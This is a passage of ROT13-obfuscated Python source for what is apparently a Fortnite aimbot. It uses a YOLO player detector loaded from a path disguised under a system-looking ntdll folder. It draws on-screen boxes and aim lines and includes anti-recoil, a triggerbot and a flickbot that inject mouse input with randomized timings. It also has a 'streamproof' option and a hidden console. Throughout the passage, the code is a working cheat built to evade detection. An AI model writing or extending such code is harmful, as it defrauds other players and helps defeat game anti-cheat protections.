                    pragre_l = frys.urvtug() // 2 -11
                    cnvagre.qenjYvar(pragre_k, pragre_l + 3, pragre_k, pragre_l - 3)
                    cnvagre.qenjYvar(pragre_k - 3, pragre_l, pragre_k + 3, pragre_l)
                ryfr:
                    vs frys.OyhrNQF():
                        cra_pebffunve_nqf = DCra(DPbybe(255, 255, 255, 255), 0.5, Dg.FbyvqYvar)
                        cnvagre.frgCra(cra_pebffunve_nqf)
                        cnvagre.frgEraqreUvag(DCnvagre.Nagvnyvnfvat, Snyfr)
                        pragre_k = frys.jvqgu() // 2 -11
                        pragre_l = frys.urvtug() // 2 -11
                        cnvagre.qenjYvar(pragre_k, pragre_l + 5, pragre_k, pragre_l - 5)
                        cnvagre.qenjYvar(pragre_k - 5, pragre_l, pragre_k + 5, pragre_l)
                    ryfr:
                        cra_pebffunve = DCra(DPbybe(255, 255, 255, 255), 1.1, Dg.FbyvqYvar)
                        cnvagre.frgCra(cra_pebffunve)
                        cnvagre.frgEraqreUvag(DCnvagre.Nagvnyvnfvat, Snyfr)
                        pragre_k = frys.jvqgu() // 2 -11
                        pragre_l = frys.urvtug() // 2 -11
                        cnvagre.qenjYvar(pragre_k, pragre_l + 7, pragre_k, pragre_l - 7)
                        cnvagre.qenjYvar(pragre_k - 7, pragre_l, pragre_k + 7, pragre_l)
                        qbg_enqvhf = 1
                        vs Hfr_Uhr:
                            uhr = frys.uhr_hcqngre.uhr
                            qbg_cra = DCra(DPbybe.sebzUfi(uhr, 255, 255), qbg_enqvhf * 2)
                        ryfr:
                            qbg_cra = DCra(frys.pebffunve_qbg_pbybe, qbg_enqvhf * 2)
                        cnvagre.frgCra(qbg_cra)
                        cnvagre.qenjCbvag(pragre_k, pragre_l)
                        cra_pebffunve_bhgyvar = DCra(Dg.oynpx, 1, Dg.FbyvqYvar)  # Nqwhfg guvpxarff nf arrqrq
                        cnvagre.frgCra(cra_pebffunve_bhgyvar)
                        bhgyvar_bssfrg = 1
                        cnvagre.qenjYvar(pragre_k - bhgyvar_bssfrg, pragre_l + 8, pragre_k - bhgyvar_bssfrg, pragre_l - 8)
                        cnvagre.qenjYvar(pragre_k - 8, pragre_l - bhgyvar_bssfrg, pragre_k + 8, pragre_l - bhgyvar_bssfrg)
                        cnvagre.qenjYvar(pragre_k + bhgyvar_bssfrg, pragre_l + 8, pragre_k + bhgyvar_bssfrg, pragre_l - 8)
                        cnvagre.qenjYvar(pragre_k - 8, pragre_l + bhgyvar_bssfrg, pragre_k + 8, pragre_l + bhgyvar_bssfrg)
                        cnvagre.qenjYvar(pragre_k - bhgyvar_bssfrg, pragre_l - 8, pragre_k + bhgyvar_bssfrg, pragre_l - 8)
                        cnvagre.qenjYvar(pragre_k - bhgyvar_bssfrg, pragre_l + 8, pragre_k + bhgyvar_bssfrg, pragre_l + 8)
                        cnvagre.qenjYvar(pragre_k - 8, pragre_l - bhgyvar_bssfrg, pragre_k - 8, pragre_l + bhgyvar_bssfrg)
                        cnvagre.qenjYvar(pragre_k + 8, pragre_l - bhgyvar_bssfrg, pragre_k + 8, pragre_l + bhgyvar_bssfrg)
                    frys.hcqngr()

            vs frys.pheerag_fybg_fryrpgrqq == 6:
                vs Ranoyr_Fybgf:
                    cnff
            ryfr:
                vs Fubj_Qrgrpgvbaf:
                    sbe cynlre va frys.qrgrpgrq_cynlref:

                        k1, l1, k2, l2 = cynlre['k1'], cynlre['l1'], cynlre['k2'], cynlre['l2']
                        urnq1, urnq2 = cynlre['urnq1'], cynlre['urnq2']

                        #frys.hcqngr_sbi_fvmr()

                        jvqgu = k2 - k1
                        urvtug = l2 - l1

                        znetva_snpgbe = 0.1
                        znetva_k = jvqgu * znetva_snpgbe
                        znetva_l = urvtug * znetva_snpgbe

                        k1 -= znetva_k
                        l1 -= znetva_l
                        k2 += znetva_k
                        l2 += znetva_l
                        jvqgu = k2 - k1
                        urvtug = l2 - l1
                        k1, l1, k2, l2 = vag(k1), vag(l1), vag(k2), vag(l2)
                        urnq1, urnq2 = vag(urnq1), vag(urnq2)

                        vs Obk_glcr == "Pbeare":
                            vs Hfr_Uhr:
                                uhr = vag(gvzr.gvzr() * 150) % 360
                                pbybe = DPbybe.sebzUfi(uhr, 255, 255, 255)
                                cnvagre.frgCra(DCra(pbybe, 1))
                            ryfr:
                                cnvagre.frgCra(DCra(frys.sbi_pbybe, 1))

                            pbeare_yratgu = vag(zva(jvqgu, urvtug) * 0.1) 

                            vs Ivfhny_Bhgyvarf:
                                cnvagre.frgCra(DCra(Dg.oynpx, 1))
                                cnvagre.frgEraqreUvag(DCnvagre.Nagvnyvnfvat, Snyfr)
                                # Gbc-yrsg pbeare (bhgfvqr)
                                cnvagre.qenjYvar(k1 - 1, l1 - 1, k1 + pbeare_yratgu + 1, l1 - 1)
                                cnvagre.qenjYvar(k1 - 1, l1 - 1, k1 - 1, l1 + pbeare_yratgu + 1)
                                # Gbc-evtug pbeare (bhgfvqr)
                                cnvagre.qenjYvar(k2 + 1, l1 - 1, k2 - pbeare_yratgu - 1, l1 - 1)
                                cnvagre.qenjYvar(k2 + 1, l1 - 1, k2 + 1, l1 + pbeare_yratgu + 1)
                                # Obggbz-yrsg pbeare (bhgfvqr)
                                cnvagre.qenjYvar(k1 - 1, l2 + 1, k1 + pbeare_yratgu + 1, l2 + 1)
                                cnvagre.qenjYvar(k1 - 1, l2 + 1, k1 - 1, l2 - pbeare_yratgu - 1)
                                # Obggbz-evtug pbeare (bhgfvqr)
                                cnvagre.qenjYvar(k2 + 1, l2 + 1, k2 - pbeare_yratgu - 1, l2 + 1)
                                cnvagre.qenjYvar(k2 + 1, l2 + 1, k2 + 1, l2 - pbeare_yratgu - 1)

                            vs Hfr_Uhr:
                                uhr = vag(gvzr.gvzr() * 150) % 360
                                pbybe = DPbybe.sebzUfi(uhr, 255, 255, 255)
                                cnvagre.frgCra(DCra(pbybe, 2))
                            ryfr:
                                cnvagre.frgCra(DCra(DPbybe(255,255,255,255), 1))
                            cnvagre.qenjYvar(k1, l1, k1 + pbeare_yratgu, l1)
                            cnvagre.qenjYvar(k1, l1, k1, l1 + pbeare_yratgu)
                            cnvagre.qenjYvar(k2, l1, k2 - pbeare_yratgu, l1)
                            cnvagre.qenjYvar(k2, l1, k2, l1 + pbeare_yratgu)
                            cnvagre.qenjYvar(k1, l2, k1 + pbeare_yratgu, l2)
                            cnvagre.qenjYvar(k1, l2, k1, l2 - pbeare_yratgu)
                            cnvagre.qenjYvar(k2, l2, k2 - pbeare_yratgu, l2)
                            cnvagre.qenjYvar(k2, l2, k2, l2 - pbeare_yratgu)

                            # vs Ivfhny_Bhgyvarf:
                            # 	cnvagre.frgCra(DCra(Dg.oynpx, 1))
                            # 	cnvagre.frgEraqreUvag(DCnvagre.Nagvnyvnfvat, Snyfr)
                            # 	# Gbc-yrsg pbeare (vafvqr)
                            # 	cnvagre.qenjYvar(k1 + 1, l1 + 1, k1 + pbeare_yratgu - 1, l1 + 1)
                            # 	cnvagre.qenjYvar(k1 + 1, l1 + 1, k1 + 1, l1 + pbeare_yratgu - 1)
                            # 	# Gbc-evtug pbeare (vafvqr)
                            # 	cnvagre.qenjYvar(k2 - 1, l1 + 1, k2 - pbeare_yratgu + 1, l1 + 1)
                            # 	cnvagre.qenjYvar(k2 - 1, l1 + 1, k2 - 1, l1 + pbeare_yratgu - 1)
                            # 	# Obggbz-yrsg pbeare (vafvqr)
                            # 	cnvagre.qenjYvar(k1 + 1, l2 - 1, k1 + pbeare_yratgu - 1, l2 - 1)
                            # 	cnvagre.qenjYvar(k1 + 1, l2 - 1, k1 + 1, l2 - pbeare_yratgu + 1)
                            # 	# Obggbz-evtug pbeare (vafvqr)
                            # 	cnvagre.qenjYvar(k2 - 1, l2 - 1, k2 - pbeare_yratgu + 1, l2 - 1)
                            # 	cnvagre.qenjYvar(k2 - 1, l2 - 1, k2 - 1, l2 - pbeare_yratgu + 1)
                        ryvs Obk_glcr == "Erthyne":
                            vs Hfr_Uhr:
                                uhr = vag(gvzr.gvzr() * 150) % 360
                                pbybe = DPbybe.sebzUfi(uhr, 255, 255, 55)
                                cnvagre.frgCra(DCra(pbybe, 2))
                            ryfr:
                                cnvagre.frgCra(DCra(frys.sbi_pbybe, 2))

                            # Qenj gur erpgnatyr hfvat yvarf
                            cnvagre.qenjYvar(k1, l1, k2, l1)  # Gbc rqtr
                            cnvagre.qenjYvar(k2, l1, k2, l2)  # Evtug rqtr
                            cnvagre.qenjYvar(k2, l2, k1, l2)  # Obggbz rqtr
                            cnvagre.qenjYvar(k1, l2, k1, l1)
                        ryvs Obk_glcr == "Svyyrq":
                            vs Hfr_Uhr:
                                uhr = vag(gvzr.gvzr() * 150) % 360
                                pbybe = DPbybe.sebzUfi(uhr, 255, 255, 55)
                                cnvagre.frgCra(DCra(pbybe, 2))
                            ryfr:
                                cnvagre.frgCra(DCra(DPbybe(151, 158, 248, vag(255 * 0.75)), 2))

                            svyy_pbybe = DPbybe(151, 158, 248, vag(255 * 0.25))
                            cnvagre.frgOehfu(DOehfu(svyy_pbybe, Dg.FbyvqCnggrea))

                            cbvagf = [DCbvag(k1, l1), DCbvag(k2, l1), DCbvag(k2, l2), DCbvag(k1, l2)]

                            cnvagre.qenjCbyltba(DCbyltba(cbvagf))

                            # # Qenj gur bhgyvar bs gur erpgnatyr hfvat yvarf
                            # cnvagre.qenjYvar(k1, l1, k2, l1)  # Gbc rqtr
                            # cnvagre.qenjYvar(k2, l1, k2, l2)  # Evtug rqtr
                            # cnvagre.qenjYvar(k2, l2, k1, l2)  # Obggbz rqtr
                            # cnvagre.qenjYvar(k1, l2, k1, l1)
                vs Fubj_Nvzyvar:
                    sbe cynlre va frys.qrgrpgrq_cynlref:
                        urnq1, urnq2 = cynlre['urnq1'], cynlre['urnq2']  # Rkgenpg urnq1 naq urnq2
                        # frys.hcqngr_sbi_fvmr()
                        pragre_k, pragre_l = frys.Sbi_Fvmr // 2 + 1, frys.Sbi_Fvmr // 2 + 1

                        # Nqwhfg guvpxarff sbe fznyyre bhgyvar yvarf
                        cnvagre.frgCra(DCra(frys.sbi_pbybe, 0.5))  # Hfr 0.5 sbe n guvaare yvar
                        cnvagre.qenjYvar(urnq1 - 1, urnq2, pragre_k - 1, pragre_l)
                        cnvagre.qenjYvar(urnq1 + 1, urnq2, pragre_k + 1, pragre_l)
                        cnvagre.qenjYvar(urnq1, urnq2 - 1, pragre_k, pragre_l - 1)
                        cnvagre.qenjYvar(urnq1, urnq2 + 1, pragre_k, pragre_l + 1)

                        # Qenj gur znva nvz yvar jvgu gur pubfra guvpxarff
                        vs Hfr_Uhr:
                            cnvagre.frgCra(DCra(pbybe, 0.5))  # Nqwhfg guvf inyhr sbe guvpxarff
                        ryfr:
                            cnvagre.frgCra(DCra(frys.sbi_pbybe, 0.5))  # Guvaare nvz yvar
                        cnvagre.qenjYvar(urnq1, urnq2, pragre_k, pragre_l)

                # vs Hfr_Uhr:
                # 	obggbz_yrsg_grkg = "0kJGS"
                # 	grkg_erpg = DErpg(10, frys.urvtug() - 15, frys.jvqgu() - 15, 16)
                # 	cra_oynpx = DCra(DPbybe(0, 0, 0, 255), 2.5, Dg.FbyvqYvar)
                # 	cnvagre.frgCra(cra_oynpx)
                # 	sbe qk va [-1, 0, 1]:
                # 		sbe ql va [-1, 0, 1]:
                # 			cnvagre.qenjGrkg(grkg_erpg.genafyngrq(qk, ql), Dg.NyvtaEvtug | Dg.NyvtaObggbz, obggbz_yrsg_grkg)
                # 	cra_juvgr = DCra(DPbybe(255, 255, 255), 0.5, Dg.FbyvqYvar)
                # 	cnvagre.frgCra(cra_juvgr)
                # 	cnvagre.qenjGrkg(grkg_erpg, Dg.NyvtaEvtug | Dg.NyvtaObggbz, obggbz_yrsg_grkg)
                # ryfr:
                # 	obggbz_yrsg_grkg = "0kJGS"
                # 	grkg_erpg = DErpg(10, frys.urvtug()-15, frys.jvqgu()-15, 16)
                # 	cra_oynpx = DCra(frys.jngreznex_pbybe_bhgyvar, 2.5, Dg.FbyvqYvar)
                # 	cnvagre.frgCra(cra_oynpx)
                # 	sbe qk va [-1, 0, 1]:
                # 		sbe ql va [-1, 0, 1]:
                # 			cnvagre.qenjGrkg(grkg_erpg.genafyngrq(qk, ql), Dg.NyvtaEvtug | Dg.NyvtaObggbz, obggbz_yrsg_grkg)
                # 	cnvagre.frgCra(DCra(frys.jngreznex_pbybe, frys.jngreznex_guvpxarff, Dg.FbyvqYvar))
                # 	cnvagre.qenjGrkg(grkg_erpg, Dg.NyvtaEvtug | Dg.NyvtaObggbz, obggbz_yrsg_grkg)

    qrs sbphfVaRirag(frys, rirag):
        pglcrf.jvaqyy.hfre32.FrgSbphf(Abar)

Pbagebyyre_Gbttyrq = Snyfr

pynff PbagebyyreZbqr():
    tybony Pbagebyyre_Gbttyrq
    qrs znva():
        gel:
            cltnzr.vavg()
            cltnzr.wblfgvpx.vavg()

            wblfgvpx = cltnzr.wblfgvpx.Wblfgvpx(0)
            wblfgvpx.vavg()

            juvyr Gehr:
                tybony Pbagebyyre_Gbttyrq
                cltnzr.rirag.trg()

                yrsg_gevttre = wblfgvpx.trg_nkvf(4)

                vs yrsg_gevttre > 0.9:
                    Pbagebyyre_Gbttyrq = Gehr
                ryvs yrsg_gevttre < 0.9:
                    Pbagebyyre_Gbttyrq = Snyfr
                cltnzr.gvzr.jnvg(6)

        rkprcg:
            cnff

qrs YrzbaYbireS9():
    tybony NagvErpbvy_Fgeratgu
    tybony NagvErpbvy_Ba
    tybony Erqhpr_Oybbz
    tybony Erdhver_NQF
    juvyr Gehr:
        vs Erdhver_NQF:
            qrs vf_zbhfr_qbja():
                yzo_fgngr = jva32ncv.TrgXrlFgngr(0k01) & jva32ncv.TrgXrlFgngr(0k02)
                erghea yzo_fgngr < 0
        ryfr:
            qrs vf_zbhfr_qbja():
                yzo_fgngr = jva32ncv.TrgXrlFgngr(0k01)
                erghea yzo_fgngr < 0
        EbhaqrqEFge = ebhaq(NagvErpbvy_Fgeratgu)
        zva_iregvpny = vag(EbhaqrqEFge)
        znk_iregvpny = vag(EbhaqrqEFge) + 1
        vs vf_zbhfr_qbja():
            ubevmbagny_bssfrg = enaqbz.enaqenatr(-2 * 1000, 2 * 1000, 1) / 1000
            iregvpny_bssfrg = enaqbz.enaqenatr(zva_iregvpny * 1000, vag(znk_iregvpny * 1000), 1) / 1000
            vs NagvErpbvy_Ba:
                jva32ncv.zbhfr_rirag(0k0001, 0, vag(iregvpny_bssfrg))
            vs Erqhpr_Oybbz:
                jva32ncv.zbhfr_rirag(0k0001, vag(ubevmbagny_bssfrg), 0)
            gvzr_bssfrg = enaqbz.enaqenatr(2, 25, 1) / 1000
            gvzr.fyrrc(gvzr_bssfrg)
        gvzr.fyrrc(enaqbz.havsbez(0.00005, 0.00010))

guernqvat.Guernq(gnetrg=PbagebyyreZbqr.znva).fgneg()
guernqvat.Guernq(gnetrg=YrzbaYbireS9).fgneg()

pynff Nv992:
    gel:
        ncc = DNccyvpngvba(flf.neti + ['-cyngsbez', 'jvaqbjf:qnexzbqr=1'])
    rkprcg:
        ncc = DNccyvpngvba(flf.neti)

    jvaqbj = ZlJvaqbj()

    rkgen = pglcrf.p_hybat(0)
    vv_ = Vachg_V()
    fperra_k = vag(fperra_erf_K /2)
    fperra_l = vag(fperra_erf_L /2)
    fperra = zff.zff()
    ybpx = guernqvat.Ybpx()
    pheerag_fybg_fryrpgrq = 1

    qrs __vavg__(frys):
        tybony Sbi_Fvmr
        tybony Fubj_Qroht
        tybony Fubj_SCF
        tybony Nvz_Fzbbgu
        tybony Znk_Qrgrpgvbaf
        tybony Ranoyr_Nvz
        tybony Pbagebyyre_Ba
        tybony Ranoyr_GevttreObg
        tybony Xrlovaq
        tybony Xrlovaq2
        tybony Pbasvqrapr
        tybony Nhgb_Sver_Sbi_Fvmr
        tybony Nhgb_Sver_Pbasvqrapr
        tybony Nhgb_Sver_Xrlovaq
        tybony Erdhver_Xrlovaq
        tybony Pbagebyyre_Gbttyrq
        tybony Nvz_Obar
        tybony Obk_glcr
        tybony PhcZbqr_Ba
        tybony Ranoyr_Syvpx_Obg
        tybony Syvpx_Fpbcr_Fraf
        tybony Syvpx_Qrynl
        tybony Syvpx_Pbbyqbja
        tybony Syvpxobg_Xrlovaq
        tybony Fgernzcebbs

        tybony Ranoyr_Fybgf
        tybony Fybg1_Xrlovaq
        tybony Fybg2_Xrlovaq
        tybony Fybg3_Xrlovaq
        tybony Fybg4_Xrlovaq
        tybony Fybg5_Xrlovaq
        tybony Fybg6_Xrlovaq

        tybony Sbi_Fvmr_Fybg1
        tybony Sbi_Fvmr_Fybg2
        tybony Sbi_Fvmr_Fybg3
        tybony Sbi_Fvmr_Fybg4
        tybony Sbi_Fvmr_Fybg5

        tybony Ranoyr_Nvz_Fybg1
        tybony Ranoyr_Nvz_Fybg2
        tybony Ranoyr_Nvz_Fybg3
        tybony Ranoyr_Nvz_Fybg4
        tybony Ranoyr_Nvz_Fybg5

        tybony Hfr_Zbqry_Pynff
        tybony Vzt_Inyhr
        tybony Zbqry_SCF

        frys.ynfg_syvpx = gvzr.gvzr()

        frys.fgneg_gvzr = gvzr.gvzr()

        frys.qrsnhyg_zbqry = LBYB("P:\\CebtenzQngn\\FbsgjbexPE\\agqyy\\Ynatf\\RA-HF\\QngrgvzrPbasvthengvbaf\\Pe\\Sbegavgr.cg")

    qrs yrsg_pyvpx():
        vs jva32ncv.TrgXrlFgngr(jva32pba.IX_YOHGGBA) va (-127, -128):
            cnff
        ryfr:
            vs Erdhver_Xrlovaq:
                vs jva32ncv.TrgNflapXrlFgngr(Nhgb_Sver_Xrlovaq) < 0:
                    pglcrf.jvaqyy.hfre32.zbhfr_rirag(0k0002)
                    gvzr.fyrrc(enaqbz.havsbez(0.0002, 0.00002))
                    pglcrf.jvaqyy.hfre32.zbhfr_rirag(0k0004)
                    gvzr.fyrrc(enaqbz.havsbez(0.0002, 0.00002))
                ryfr:
                    cnff
            ryfr:
                pglcrf.jvaqyy.hfre32.zbhfr_rirag(0k0002)
                gvzr.fyrrc(enaqbz.havsbez(0.0002, 0.00002))
                pglcrf.jvaqyy.hfre32.zbhfr_rirag(0k0004)
                gvzr.fyrrc(enaqbz.havsbez(0.0002, 0.00002))

    qrs vf_nvzobg_ranoyrq():
        vs abg Ranoyr_Fybgf:
            erghea Ranoyr_Nvz
        erghea {
            1: Ranoyr_Nvz_Fybg1, 2: Ranoyr_Nvz_Fybg2, 3: Ranoyr_Nvz_Fybg3,
            4: Ranoyr_Nvz_Fybg4, 5: Ranoyr_Nvz_Fybg5,
        }.trg(Nv992.pheerag_fybg_fryrpgrq, Ranoyr_Nvz)

    qrs vf_syvpxobg_ranoyrq():
        erghea Ranoyr_Syvpx_Obg

    qrs vf_gevttreobg_ranoyrq():
        erghea Ranoyr_GevttreObg

    qrs vf_gnetrgrq():
        erghea Gehr vs jva32ncv.TrgNflapXrlFgngr(Xrlovaq) < 0 ryfr Snyfr

    qrs vf_gnetrgrq2():
        vs jva32ncv.TrgNflapXrlFgngr(Xrlovaq2) < 0:
            erghea Gehr
        vs Pbagebyyre_Ba:
            vs Pbagebyyre_Gbttyrq:
                erghea Gehr
        ryfr:
            erghea Snyfr

    qrs vf_gnetrgrq3():
        erghea Gehr vs jva32ncv.TrgNflapXrlFgngr(Syvpxobg_Xrlovaq) < 0 ryfr Snyfr

    qrs vf_gnetrg_ybpxrq(k, l):
        guerfubyq = Nhgb_Sver_Sbi_Fvmr
        erghea Gehr vs fperra_k - guerfubyq <= k <= fperra_k + guerfubyq naq fperra_l - guerfubyq <= l <= fperra_l + guerfubyq ryfr Snyfr

    qrs urezvgr_vagrecbyngvba(frys, c0, c1, z0, z1, g):
        g2 = g * g
        g3 = g2 * g
        u00 = 2 * g3 - 3 * g2 + 1 
        u10 = g3 - 2 * g2 + g     
        u01 = -2 * g3 + 3 * g2 
        u11 = g3 - g2
        erghea u00 * c0 + u10 * z0 + u01 * c1 + u11 * z1

    qrs fvar_vagrecbyngvba(frys, fgneg, raq, g):
        erghea fgneg + (raq - fgneg) * ac.fva(g * ac.cv / 2)

    qrs rkcbaragvny_vagrecbyngvba(frys, fgneg, raq, g, rkcbarag=2):
        erghea (raq - fgneg) * (g ** rkcbarag) + fgneg

    qrs o_fcyvar_vagrecbyngvba(frys, c0, c1, c2, c3, g):
        g2 = g * g
        g3 = g2 * g
        erghea (1/6.0) * ((-c0 + 3 * c1 - 3 * c2 + c3) * g3 +
                        (3 * c0 - 6 * c1 + 3 * c2) * g2 +
                        (-3 * c0 + 3 * c2) * g + c0 + 4 * c1 + c2)


    qrs ormvre_vagrecbyngvba(frys,fgneg, raq, g):
        erghea (1 - g) * fgneg + g * raq

    qrs pngzhyy_ebz_vagrecbyngvba(frys,c0, c1, c2, c3, g):
        erghea 0.5 * ((2 * c1) +
                    (-c0 + c2) * g +
                    (2 * c0 - 5 * c1 + 4 * c2 - c3) * g * g +
                    (-c0 + 3 * c1 - 3 * c2 + c3) * g * g * g)

    qrs zbir_pebffunve(frys, k, l, zizrag=Abar):
        vs abg Nv992.vf_gnetrgrq() naq abg Nv992.vf_gnetrgrq2():
            erghea

        qrygn_k = (k - fperra_k) * 1.0
        qrygn_l = (l - fperra_l) * 1.0
        qvfgnapr = ac.yvanyt.abez((qrygn_k, qrygn_l))

        vs qvfgnapr == 0:
            erghea

        fzbbguvat = ebhaq(0.5 + (Nvz_Fzbbgu - 10) / 10.0, 1)
        zbir_k = (qrygn_k / qvfgnapr) * cvkry_vaperzrag * fzbbguvat
        zbir_l = (qrygn_l / qvfgnapr) * cvkry_vaperzrag * fzbbguvat
        zbir_k *= frafvgvivgl
        zbir_l *= frafvgvivgl
        zbir_k += enaqbz.havsbez(-enaqbzarff, enaqbzarff)
        zbir_l += enaqbz.havsbez(-enaqbzarff, enaqbzarff)

        qvfgnapr_pynzcrq = zva(1, (qvfgnapr / qvfgnapr_gb_fpnyr))
        zbir_k *= qvfgnapr_pynzcrq
        zbir_l *= qvfgnapr_pynzcrq

        vs zizrag == "Ormvre":
            g = qvfgnapr / qvfgnapr_gb_fpnyr  # Rknzcyr cnenzrgre sbe vagrecbyngvba
            zbir_k = frys.ormvre_vagrecbyngvba(0, zbir_k, g)
            zbir_l = frys.ormvre_vagrecbyngvba(0, zbir_l, g)
        ryvs zizrag == "Pngzhyy":
            c0, c1, c2, c3 = 0, zbir_k, zbir_k * 1.2, zbir_k * 1.5
            zbir_k = frys.pngzhyy_ebz_vagrecbyngvba(c0, c1, c2, c3, qvfgnapr / qvfgnapr_gb_fpnyr)
            c0, c1, c2, c3 = 0, zbir_l, zbir_l * 1.2, zbir_l * 1.5
            zbir_l = frys.pngzhyy_ebz_vagrecbyngvba(c0, c1, c2, c3, qvfgnapr / qvfgnapr_gb_fpnyr)
        ryvs zizrag == "Urezvgr":
            c0, c1 = 0, zbir_k  # Rknzcyr pbageby cbvagf
            z0, z1 = zbir_k * 1.2, zbir_k * 1.5  # Gnatragf
            zbir_k = frys.urezvgr_vagrecbyngvba(c0, c1, z0, z1, qvfgnapr / qvfgnapr_gb_fpnyr)
            c0, c1 = 0, zbir_l
            z0, z1 = zbir_l * 1.2, zbir_l * 1.5
            zbir_l = frys.urezvgr_vagrecbyngvba(c0, c1, z0, z1, qvfgnapr / qvfgnapr_gb_fpnyr)
        ryvs zizrag == "O-Fcyvar":
            c0, c1, c2, c3 = 0, zbir_k, zbir_k * 1.2, zbir_k * 1.5  # Rknzcyr pbageby cbvagf
            zbir_k = frys.o_fcyvar_vagrecbyngvba(c0, c1, c2, c3, qvfgnapr / qvfgnapr_gb_fpnyr)
            c0, c1, c2, c3 = 0, zbir_l, zbir_l * 1.2, zbir_l * 1.5
            zbir_l = frys.o_fcyvar_vagrecbyngvba(c0, c1, c2, c3, qvfgnapr / qvfgnapr_gb_fpnyr)
        ryvs zizrag == "Fvar":
            zbir_k = frys.fvar_vagrecbyngvba(0, zbir_k, qvfgnapr / qvfgnapr_gb_fpnyr)
            zbir_l = frys.fvar_vagrecbyngvba(0, zbir_l, qvfgnapr / qvfgnapr_gb_fpnyr)
        ryvs zizrag == "Rkcbaragvny":
            zbir_k = frys.rkcbaragvny_vagrecbyngvba(0, zbir_k, qvfgnapr / qvfgnapr_gb_fpnyr, rkcbarag=2)
            zbir_l = frys.rkcbaragvny_vagrecbyngvba(0, zbir_l, qvfgnapr / qvfgnapr_gb_fpnyr, rkcbarag=2)

        ryfr:
            fzbbgu_zbir_k = fzbbguvat * zbir_k + (1 - fzbbguvat) * zbir_k
            fzbbgu_zbir_l = fzbbguvat * zbir_l + (1 - fzbbguvat) * zbir_l
            fzbbgu_zbir_k = frafvgvivgl * fzbbgu_zbir_k + (1 - frafvgvivgl) * zbir_k
            fzbbgu_zbir_l = frafvgvivgl * fzbbgu_zbir_l + (1 - frafvgvivgl) * zbir_l

            zbir_k = fzbbgu_zbir_k
            zbir_l = fzbbgu_zbir_l

        jvgu Nv992.ybpx:
            Nv992.vv_.zv = ZbhfrVachg(ebhaq(zbir_k), ebhaq(zbir_l), 0, 0k0001, 0, pglcrf.cbvagre(Nv992.rkgen))
            vachg_fgehpg = Vachg(pglcrf.p_hybat(0), Nv992.vv_)
            pglcrf.jvaqyy.hfre32.FraqVachg(1, pglcrf.olers(vachg_fgehpg), pglcrf.fvmrbs(vachg_fgehpg))

    qrs zbir_pebffunve_fvyrag(frys, k, l):
        vs abg Nv992.vf_gnetrgrq3():
            erghea

        syvpx_fgeratgu = ebhaq(0.8 + (Syvpx_Fpbcr_Fraf - 10) * (2.5 - 0.8) / (90 - 10), 2)

        qrygn_k = (k - fperra_k) * syvpx_fgeratgu
        qrygn_l = (l - fperra_l) * syvpx_fgeratgu

        #cevag(syvpx_fgeratgu)

        Nv992.vv_.zv = ZbhfrVachg(ebhaq(qrygn_k), ebhaq(qrygn_l), 0, 0k0001, 0, pglcrf.cbvagre(Nv992.rkgen))
        vachg_fgehpg = Vachg(pglcrf.p_hybat(0), Nv992.vv_)
        pglcrf.jvaqyy.hfre32.FraqVachg(1, pglcrf.olers(vachg_fgehpg), pglcrf.fvmrbs(vachg_fgehpg))

        gvzr.fyrrc(Syvpx_Qrynl)

        vs jva32ncv.TrgXrlFgngr(jva32pba.IX_YOHGGBA) va (-127, -128):
            cnff
        ryfr:
            pglcrf.jvaqyy.hfre32.zbhfr_rirag(0k0002)
            gvzr.fyrrc(enaqbz.havsbez(0.00008, 0.00002))
            pglcrf.jvaqyy.hfre32.zbhfr_rirag(0k0004)

        gvzr.fyrrc(Syvpx_Qrynl/4)

        jvgu Nv992.ybpx:
            Nv992.vv_.zv = ZbhfrVachg(ebhaq(-qrygn_k), ebhaq(-qrygn_l), 0, 0k0001, 0, pglcrf.cbvagre(Nv992.rkgen))
            vachg_fgehpg = Vachg(pglcrf.p_hybat(0), Nv992.vv_)
            pglcrf.jvaqyy.hfre32.FraqVachg(1, pglcrf.olers(vachg_fgehpg), pglcrf.fvmrbs(vachg_fgehpg))

        frys.ynfg_syvpx = gvzr.gvzr()

    qrs trg_gnet_scf():
        gnetrg_scf = Zbqry_SCF
        senzr_qhengvba = 1.5 / gnetrg_scf
        erghea senzr_qhengvba

    qrs fgneg(frys):
        xreary32 = pglcrf.JvaQYY('xreary32')
        hfre32 = pglcrf.JvaQYY('hfre32')
        uJaq = xreary32.TrgPbafbyrJvaqbj()
        FJ_UVQR = 0
        Nv992.jvaqbj.fubj()
        unys_fperra_jvqgu = pglcrf.jvaqyy.hfre32.TrgFlfgrzZrgevpf(0) / 2
        unys_fperra_urvtug = pglcrf.jvaqyy.hfre32.TrgFlfgrzZrgevpf(1) / 2
        pybfrfg_qrgrpgvba = Abar
        qrgrpgrq_cynlref = []
        vs hfr_zff == 0:
            pnzren = orggrepnz.perngr(bhgchg_vqk=0, bhgchg_pbybe="OTE", znk_ohssre_yra=1)
        gel:
            jvafbhaq.CynlFbhaq(e'P:\\Jvaqbjf\\Zrqvn\\Jvaqbjf Onyybba.jni', jvafbhaq.FAQ_SVYRANZR)
        rkprcg:
            cnff
        bf.flfgrz("pyf")
        vs qbag_ynhapu_bireynlf == 1:
            cnff
        ryfr:
            bireynl = QrgrpgvbaObk()
            scfjvaq = SCFBireynl()
            bireynl.fubj()
        gel:
            bcra(es"{pheerag_qverpgbel}\rkgen\tsk\fpbf.gkg","e").ernq()
        rkprcg:
            hfre32.FubjJvaqbj(uJaq, FJ_UVQR)
            bf.flfgrz("pyf")
        juvyr Gehr:
            gel:
                vs Fubj_SCF == Gehr:
                    scfjvaq.fubj()
                ryvs Fubj_SCF == Snyfr:
                    scfjvaq.uvqr()
            rkprcg:
                cnff
            fgneg_gvzr = gvzr.cres_pbhagre()

            xrl_fgngrf = {
                "S1": jva32ncv.TrgXrlFgngr(jva32pba.IX_S1),
                "S2": jva32ncv.TrgXrlFgngr(jva32pba.IX_S2),
                "VAF": jva32ncv.TrgXrlFgngr(jva32pba.IX_VAFREG)
            }

            vs xrl_fgngrf["VAF"] va (-127, -128):
                gel:
                    Nv992.jvaqbj.gbttyr_zrah_ivfvovyvgl()
                rkprcg:
                    gvzr.fyrrc(0.15)
                    Nv992.jvaqbj.gbttyr_zrah_ivfvovyvgl()
                gvzr.fyrrc(0.15)

            vs abg PhcZbqr_Ba:
                vs xrl_fgngrf["S1"] va (-127, -128):
                    gvzr.fyrrc(0.25)
                    zl_jvaqbj1m = ZlJvaqbj()
                    zl_jvaqbj1m.gbttyr_purpxobk1(Gehr)

                vs xrl_fgngrf["S2"] va (-127, -128):
                    gvzr.fyrrc(0.25)
                    gel:
